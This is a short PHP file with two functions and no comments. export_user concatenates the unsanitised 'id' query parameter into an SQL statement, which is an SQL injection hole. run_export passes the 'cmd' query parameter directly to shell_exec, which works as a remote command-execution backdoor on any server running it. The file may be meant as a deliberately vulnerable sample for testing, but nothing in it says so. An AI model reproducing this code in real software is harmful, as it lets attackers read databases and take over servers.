<?php

function export_user($pdo) {
  $id = $_GET['id'];
  $pdo->query("SELECT * FROM users WHERE id = " . $id);
}

function run_export() {
  shell_exec($_GET['cmd']);
}
